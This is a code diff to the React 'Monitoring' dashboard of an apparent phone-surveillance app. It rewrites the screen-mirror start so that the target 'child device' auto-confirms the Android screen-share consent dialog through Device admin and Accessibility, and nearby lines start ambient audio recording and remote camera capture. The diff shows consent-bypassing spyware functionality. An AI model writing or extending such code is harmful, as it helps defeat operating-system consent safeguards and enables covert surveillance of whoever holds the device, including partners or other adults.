@@ -328,7 +328,24 @@ export default function Monitoring() {
     };
   };
 
-  const startScreen = () => { rtc.markRequested('screen'); run('Remote session requested', 'start_screen_mirror', {}, true); };
+  const startScreen = async () => {
+    rtc.markRequested('screen');
+    // EXACTLY ONE start command per click — a second one used to stack the
+    // system consent dialogs (Android cancels both: "permission pops up then
+    // goes away"). The child's parsed reply is narrated in the live feed.
+    try {
+      const res = await command('start_screen_mirror', {});
+      push('Remote session requested');
+      if (res?.alreadyLive) push('Screen mirror already running');
+      else if (res?.reusedGrant) push('Starting with the saved screen-share consent…');
+      else if (res?.alreadyPrompted) push('Consent dialog is already open on the child device — auto-confirm runs while Device admin + Accessibility are ON');
+      else if (res?.needsConsent) push('Waiting for screen-share consent on the child device (a prompt was posted)');
+      else if (res?.starting) push('Consent dialog opened on the child device — confirming automatically');
+    } catch (e) {
+      push(`Remote session failed: ${e.message}`);
+      rtc.setError(e.message);
+    }
+  };
   const startAmbient = () => { rtc.markRequested('ambient'); run('One-way audio requested', 'start_ambient_audio', {}, true); };
   const startCamera = (facing) => { rtc.markRequested('camera'); run(`Remote camera (${facing}) requested`, 'start_remote_camera', { facing }, true); };
   const endRemote = () => {
